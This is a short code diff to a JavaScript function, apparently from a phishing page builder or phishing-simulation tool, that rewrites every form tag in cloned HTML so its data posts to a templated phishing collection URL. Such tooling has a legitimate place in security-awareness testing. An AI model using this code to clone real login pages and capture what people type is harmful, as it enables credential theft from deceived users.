@@ -307,11 +307,22 @@ function injectPhishingFormWebAction(content) {
     return `<form action="<%-phishing_url_submit%>" method="post">\n${content}\n</form>`;
   }
 
-  return content.replace(/<form(\b[^>]*)>/gi, (match, attrs) => {
-    const cleanedAttrs = (attrs || '')
-      .replace(/\s*action\s*=\s*(["'])[^"']*\1/gi, '')
-      .replace(/\s*method\s*=\s*(["'])[^"']*\1/gi, '');
-    return `<form${cleanedAttrs} action="<%-phishing_url_submit%>" method="post">`;
+  return content.replace(/<form(\b(?:[^>"']|"[^"]*"|'[^']*')*?)>/gi, (_match, attrs) => {
+    let a = attrs || '';
+
+    if (/\baction\s*=/i.test(a)) {
+      a = a.replace(/\baction\s*=\s*(["'])[^"']*\1/gi, `action="<%-phishing_url_submit%>"`);
+    } else {
+      a += ` action="<%-phishing_url_submit%>"`;
+    }
+
+    if (/\bmethod\s*=/i.test(a)) {
+      a = a.replace(/\bmethod\s*=\s*(["'])[^"']*\1/gi, `method="post"`);
+    } else {
+      a += ` method="post"`;
+    }
+
+    return `<form${a}>`;
   });
 }
 
